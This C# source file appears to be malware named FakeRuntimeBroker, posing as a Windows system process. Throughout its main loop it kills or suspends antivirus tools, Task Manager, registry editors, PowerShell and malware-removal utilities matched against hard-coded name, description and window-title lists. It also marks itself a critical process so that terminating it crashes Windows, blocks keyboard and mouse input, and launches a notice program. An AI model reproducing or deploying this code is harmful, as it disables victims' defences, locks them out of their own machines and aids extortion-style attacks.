using Microsoft.Win32;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace FakeRuntimeBroker
{
    internal static class Program
    {
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr NtSuspendProcess(IntPtr ProcessHandle);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetInformationProcess(IntPtr Handle, int p1, ref int p2, int p3);
        static int isCritical = 1;
        static int count = 0;
        static string number = "";

        static string[] banneddesc = { "SimpleUnlocker", "Uninstall Tool", "Process Hacker", "Total Commander", "Windows Command Processor",
                "Windows PowerShell", "Windows PowerShell ISE", "Монитор ресурсов и производительности", "Registrierungsdatenbank-Werkzeug", "WinSCP: SFTP, FTP, WebDAV, S3 and SCP client",
                "Антивирусная утилита AVZ", "BakF5uqReyVCMD", "malwarebytes", "malware", "MHelperV2", "NedoUnlocker", "reg", "task", "антивирус", "outpost" };

        static string[] bannedwindows = { "Total Uninstall", "RegAlyzer", "Kaspersky Free", "Установить и следить за программой", "Антивирусная утилита AVZ",
                "Монитор ресурсов", "reg", "task", "антивирус", "outpost", Environment.UserName, Environment.MachineName, "Total Commander", "скачать", "утилита",
                "лаборатория", "cureit", "Spy*ware", "malwarebytes", "malware", "download", "antivirus", "anti", "defender", "process" };

        static string[] bannednames = { "SimpleUnlocker", "malwarebytes", "malware", "UninstallTool", "TotalUninstall", "ProcessHacker", "avz", "gew48rre", "MHelperV2",
                "drweb32", "drweb", "procexp", "procexp64", "TOTALCMD", "TOTALCMD64", "aps", "aus", "netcfg", "kav", "guard", "drweb", "resmon",
                "reg", "task", "антивирус", "outpost", "Utilman", "download", "antivirus", "anti", "aops", "aop", "sndvol" };

        static string[] authors = { "GNU", "GPL", "AVZ", "AV" };


        static RegistryKey key = Registry.CurrentUser.CreateSubKey("SOFTWARE\\MrL090nUI");
        private static void BlockProcesses(Process p)
        {
            try
            {
                if (p.MainModule.FileVersionInfo.LegalCopyright.Contains("Microsoft Corporation. All Rights Reserved.") || p.MainModule.FileVersionInfo.CompanyName.Contains("Корпорация Майкрософт. Все права защищены.") || p.MainModule.FileVersionInfo.LegalCopyright.Contains("Корпорация Майкрософт. Все права защищены.") || p.MainModule.FileVersionInfo.LegalCopyright.Contains("Корпорация Майкрософт. Все права защищены."))
                {
                    p.Kill();
                }
                else
                {
                    NtSuspendProcess(p.Handle);
                    key.SetValue("name", p.ProcessName);
                    BlockInput(true);
                    Process.Start("C:\\Windows\\notice.exe");
                }
            }
            catch { }
        }
        static void Main()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                try
                {
                    foreach (string s in bannednames)
                    {
                        if (p.ProcessName.ToLower().Contains(s.ToLower()))
                        {
                            try
                            {
                                p.Kill();
                            }
                            catch { }
                        }
                    }

                    foreach (string s in banneddesc)
                    {
                        if (p.MainModule.FileVersionInfo.FileDescription.ToLower().Contains(s.ToLower()))
                        {
                            try
                            {
                                p.Kill();
                            }
                            catch { }
                        }
                    }

                    foreach (string s in bannedwindows)
                    {
                        if (p.MainWindowTitle.ToLower().Contains(s.ToLower()))
                        {
                            try
                            {
                                p.Kill();
                            }
                            catch { }
                        }
                    }

                    foreach (string s in authors)
                    {
                        if (p.MainModule.FileVersionInfo.LegalCopyright.ToLower().Contains(s.ToLower()) || p.MainModule.FileVersionInfo.LegalTrademarks.ToLower().Contains(s.ToLower()) || p.MainModule.FileVersionInfo.CompanyName.ToLower().Contains(s.ToLower()))
                        {
                            try
                            {
                                BlockProcesses(p);
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
            /*ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);

            IntPtr window = GetConsoleWindow();
            ShowWindow(window, 0);*/
            while (true)
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
                processes = Process.GetProcesses();
                foreach (Process p in processes)
                {
                    try
                    {
                        foreach (string s in bannednames)
                        {
                            if (p.ProcessName.ToLower().Contains(s.ToLower()))
                            {
                                try
                                {
                                    BlockProcesses(p);
                                }
                                catch { }
                            }
                        }

                        foreach (string s in banneddesc)
                        {
                            if (p.MainModule.FileVersionInfo.FileDescription.ToLower().Contains(s.ToLower()))
                            {
                                try
                                {
                                    BlockProcesses(p);
                                }
                                catch { }
                            }
                        }

                        foreach (string s in bannedwindows)
                        {
                            if (p.MainWindowTitle.ToLower().Contains(s.ToLower()))
                            {
                                try
                                {
                                    BlockProcesses(p);
                                }
                                catch { }
                            }
                        }

                        foreach (string s in authors)
                        {
                            if (p.MainModule.FileVersionInfo.LegalCopyright.ToLower().Contains(s.ToLower()) || p.MainModule.FileVersionInfo.LegalTrademarks.ToLower().Contains(s.ToLower()) || p.MainModule.FileVersionInfo.CompanyName.ToLower().Contains(s.ToLower()))
                            {
                                try
                                {
                                    BlockProcesses(p);
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                }
                Process[] run = Process.GetProcessesByName("run");
                if (run.Length > 0)
                {
                    //Проверка заморозки
                    foreach (var pr in run)
                    {
                        try
                        {
                            if (pr.MainModule.FileVersionInfo.FileDescription == "BatonSwitch2")
                            {
                                count = 0;
                            }
                            else
                            {
                                Environment.Exit(1);
                            }
                        }
                        catch
                        {
                            Environment.Exit(1);
                        }
                    }
                }
                else
                {
                    if (count > 9)
                    {
                        Environment.Exit(1);
                    }
                    else
                    {
                        count += 1;
                    }
                }
            }
        }
    }
}
